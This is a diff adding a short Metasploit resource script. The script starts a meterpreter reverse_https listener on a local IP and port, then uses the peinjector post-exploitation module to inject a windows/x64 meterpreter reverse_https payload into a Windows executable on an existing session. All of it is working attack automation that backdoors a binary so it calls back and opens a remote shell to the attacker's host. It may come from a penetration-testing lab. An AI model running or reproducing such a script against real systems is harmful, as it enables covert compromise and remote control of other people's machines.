@@ -1,0 +1,34 @@
+<ruby>
+
+run_single('use multi/handler')
+
+run_single('set PAYLOAD  multi/meterpreter/reverse_https')
+
+run_single('set LHOST 192.168.0.105')
+
+run_single('set LPORT 4443')
+
+run_single('run -j')
+
+sleep(10)
+
+
+run_single('use post/windows/manage/peinjector')
+
+run_single('set targetpe \'c:\\Users\\alpiste\\Desktop\\test.exe\'')
+
+
+
+run_single('set session 1')
+
+run_single('set payload windows/x64/meterpreter/reverse_https')
+
+run_single('set lhost 192.168.0.105')
+
+run_single('set lport 4443')
+
+run_single('run')
+</ruby>
+
+
+
